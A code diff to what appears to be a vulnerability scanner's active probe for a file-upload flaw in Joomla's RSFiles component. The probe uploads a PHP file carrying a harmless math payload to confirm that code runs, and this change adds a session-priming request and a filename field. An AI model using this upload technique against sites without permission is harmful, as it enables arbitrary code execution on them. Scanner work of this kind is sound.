@@ -106,6 +106,9 @@ def passive_result(plugins: dict | None) -> Finding:
 
 def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
     base = normalize_url(target_url)
+    # Visiting the component initialises the session download root; the upload
+    # model reads that root instead of the configured download folder.
+    request(f"{base}/index.php?option=com_rsfiles", timeout=timeout, proxy=proxy)
     payload, expected_product = generate_php_math_payload()
     filename = f"jvh-rsfiles-{rand_str(8)}.php"
     content_type, body = build_multipart(
@@ -115,6 +118,7 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
             "folder": "",
             "from": "",
             "overwrite": "1",
+            "filename": filename,
         },
         {FILE_FIELD: (filename, payload, "application/octet-stream")},
     )
